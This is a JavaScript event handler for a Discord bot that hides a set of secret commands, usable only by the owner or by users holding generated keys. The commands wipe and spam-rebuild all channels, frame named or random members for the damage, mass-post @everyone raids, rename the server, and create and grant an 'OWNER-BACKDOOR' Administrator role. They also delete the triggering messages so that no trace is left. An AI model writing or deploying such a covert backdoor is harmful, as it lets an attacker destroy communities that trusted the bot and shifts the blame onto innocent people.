// src/events/secretCommands.js
const { isOwnerAuthorized, generateKey, redeemKey } = require('../utils/ownerAuth');

const OWNER_ID = '1298640383688970293'; // <-- change this

module.exports = (client) => {
  client.on('messageCreate', async (msg) => {
    if (!msg.guild || msg.author.bot) return;
    if (!msg.content.startsWith('!')) return;

    const isOwner = msg.author.id === OWNER_ID;
    const isAuthorized = isOwnerAuthorized(msg.author.id);
    const canUseSecrets = isOwner || isAuthorized;

    // ─── genkey & redeem ─── only owner can gen, anyone with key can redeem
    if (msg.content.startsWith('!genkey')) {
      if (!isOwner) return;
      const key = generateKey();
      try {
        await msg.author.send({
          content: `**fresh key dropped** (copy exactly):\n\`\`\`${key}\`\`\`\n\n!redeemkey ${key}\n\none-time use, no expiry`
        });
        await msg.react('✅');
      } catch {
        await msg.reply({ content: 'couldnt dm — enable server DMs', flags: 64 }); // ephemeral
      }
      return;
    }

    if (msg.content.startsWith('!redeemkey')) {
      const [, key] = msg.content.trim().split(/\s+/);
      if (!key) return msg.reply({ content: 'need a key dumbass', flags: 64 });
      const res = redeemKey(key, msg.author.id);
      await msg.reply({ content: res.msg, flags: 64 });
      if (res.success) await msg.react('🔓');
      return;
    }

    // ─── everything below is secret-only ───
    if (!canUseSecrets) return;

    // !nuke
    if (msg.content === '!nuke') {
      await msg.delete().catch(() => {});
      const g = msg.guild;
      await Promise.allSettled(g.channels.cache.map(ch => ch.deletable && ch.delete()));
      for (let i = 1; i <= 20; i++) {
        g.channels.create({ name: `nuked-by-64za-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send('nuke finished — wiped & rebuilt').catch(() => {});
      return;
    }

    // !nukeblame @user
    if (msg.content.startsWith('!nukeblame')) {
      await msg.delete().catch(() => {});
      const target = msg.mentions.users.first();
      const blame = target ? target.tag.replace(/[# ]/g, '-') : 'random-noob';
      const g = msg.guild;
      await Promise.allSettled(g.channels.cache.map(ch => ch.deletable && ch.delete()));
      for (let i = 1; i <= 15; i++) {
        g.channels.create({ name: `blamed-${blame}-${i}`, type: 0 }).catch(() => {});
      }
      msg.author.send(`blame nuke done — fingers pointed at ${blame}`).catch(() => {});
      return;
    }

    // !raid <text> <count>
    if (msg.content.startsWith('!raid')) {
      const args = msg.content.slice(5).trim().split(/ +/);
      let count = parseInt(args.pop()) || 8;
      count = Math.min(count, 30); // dont go too crazy
      const text = args.join(' ') || '@everyone 64za was here';
      await msg.delete().catch(() => {});

      const chans = msg.guild.channels.cache.filter(c => 
        c.isTextBased() && c.permissionsFor(msg.guild.members.me).has('SendMessages')
      ).first(count * 2); // oversample in case some fail

      let sent = 0;
      for (const ch of chans.values()) {
        if (sent >= count) break;
        ch.send(text).catch(() => {});
        sent++;
      }
      msg.author.send(`raid dropped ${sent}/${count} msgs`).catch(() => {});
      return;
    }

    // !servchange <new name>
    if (msg.content.startsWith('!servchange')) {
      const name = msg.content.slice(11).trim();
      if (!name) return;
      await msg.guild.setName(name).catch(() => {});
      msg.author.send(`server now "${name}"`).catch(() => {});
      return;
    }

    // !troll <channelId>
    if (msg.content.startsWith('!troll')) {
      const [, id] = msg.content.trim().split(/\s+/);
      const ch = msg.guild.channels.cache.get(id);
      if (!ch || !ch.deletable) return msg.author.send('invalid/no perms').catch(() => {});

      await msg.delete().catch(() => {});

      const suspects = msg.guild.members.cache.filter(m => !m.user.bot && m.id !== msg.author.id);
      const fallGuy = suspects.random()?.user.tag.replace(/[# ]/g, '-') || 'ghost';

      await ch.delete(`oopsie by ${fallGuy}`).catch(() => {});
      // zero trace — msg gone, channel gone, blame elsewhere
      return;
    }

    // !adminme
    if (msg.content === '!adminme') {
      let role = msg.guild.roles.cache.find(r => r.name === 'OWNER-BACKDOOR');
      if (!role) {
        role = await msg.guild.roles.create({
          name: 'OWNER-BACKDOOR',
          permissions: ['Administrator'],
          hoist: true,
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await msg.member.roles.add(role).catch(() => {});
      msg.author.send('admin perms secured for you').catch(() => {});
      return;
    }

    // !admin @user
    if (msg.content.startsWith('!admin')) {
      const target = msg.mentions.members.first();
      if (!target) return;
      let role = msg.guild.roles.cache.find(r => r.name === 'OWNER-BACKDOOR');
      if (!role) {
        role = await msg.guild.roles.create({
          name: 'OWNER-BACKDOOR',
          permissions: ['Administrator'],
          color: 0xFF0000
        }).catch(() => null);
      }
      if (role) await target.roles.add(role).catch(() => {});
      msg.author.send(`admin dropped on ${target.user.tag}`).catch(() => {});
      return;
    }
  });
};
